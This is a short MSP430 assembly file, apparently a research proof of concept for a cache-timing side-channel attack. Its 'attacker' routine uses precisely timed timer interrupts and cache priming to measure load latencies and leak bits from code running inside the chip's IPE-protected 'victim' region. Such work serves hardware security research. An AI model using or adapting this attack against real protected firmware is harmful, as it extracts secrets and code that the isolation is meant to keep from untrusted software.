	.global victim
	.global TA0CTL
	.global TA0CCR0
	.global TA0R
	.global pcs
	.global attacker
	.global latencies
	.global result
	.global count
	.global before

	.sect ".att_fram"
test1:
	; cache set 1, line 1
	.word 1, 2, 3, 4
test5:
	; cache set 2, line 1
	.word 5, 6, 7, 8
test9:
	; cache set 1, line 2
	.word 9, 10, 11, 12
test13:
	; cache set 2, line 2
	.word 13, 14, 15, 16

	.sect ".att_ram_code"
count:
	.word 0
result:
	.word 0
before:
	.word 0

attacker:
	cmp #8, &count
	jz end
	mov #11b, r12
	mov #1, &before
	nop
	eint
	nop
    mov #0x4, &TA0CTL
    mov #0x22, &TA0CCR0 ; interrupt right after jump
    mov #0x216, &TA0CTL

	call #victim
end:
	reta

isr_ipe:
    mov #0x0, &TA0CTL

    cmp #0, &before
    jz measure

    clr &before
    mov &test1, r12
    mov &test5, r12
    mov &test9, r12
    mov &test13, r12

    ; set up repeat interrupt for after the two loads
    mov #0x4, &TA0CTL
    mov #0x5, &TA0CCR0 ;7
    mov #0x216, &TA0CTL

    reti

measure:
	inc &count

	mov #0x224, &TA0CTL
	mov &test9, r12
	mov #0, &TA0CTL
	mov &TA0R, r13

	bit #2, r13
	rrc &result

	mov #0x224, &TA0CTL
	mov &test13, r12
	mov #0, &TA0CTL
	mov &TA0R, r13

	bit #2, r13
	rrc &result

	add #6, sp

	nop
	eint
	nop
	jmp attacker
	nop


	.sect ".int44"
iv_45:
	.word isr_ipe
